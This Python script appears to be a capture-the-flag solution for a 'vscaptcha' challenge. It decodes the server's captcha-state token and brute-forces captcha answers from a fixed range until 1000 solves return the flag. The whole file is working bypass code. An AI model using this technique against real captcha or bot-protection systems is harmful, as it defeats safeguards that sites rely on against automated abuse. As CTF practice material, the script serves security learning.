import sys
import json
import base64
import requests

url = "https://vscaptcha-twekqonvua-uc.a.run.app"
#url = "http://localhost:8080" # Debug

res = requests.post(f"{url}/captcha", data="{}")
x_captcha_state = res.headers["x-captcha-state"]
print(base64.b64decode(x_captcha_state.split(".")[1] + "==").decode())

while True:
    for ans in [579, 580, 581, 582, 583, 584, 585, 586, 587]: # [154, 155, 156, 157, 158, 159, 160] + [425, 426, 427]
        res = requests.post(f"{url}/captcha", data=f"{{\"solution\": {ans}}}", headers={"x-captcha-state": x_captcha_state})
        if len(res.content) == 0: # Speed up!!
            continue
        try:
            state = base64.b64decode(res.headers["x-captcha-state"].split(".")[1] + "==").decode()
        except:
            print(res.headers["x-captcha-state"]) # Padding error?
        json_state = json.loads(state)
        print(state)
        if json_state["failed"] == False:
            if json_state["numCaptchasSolved"] >= 1000:
                print(f"Flag: {json_state['flag']}")
                sys.exit()
            x_captcha_state = res.headers["x-captcha-state"]
            break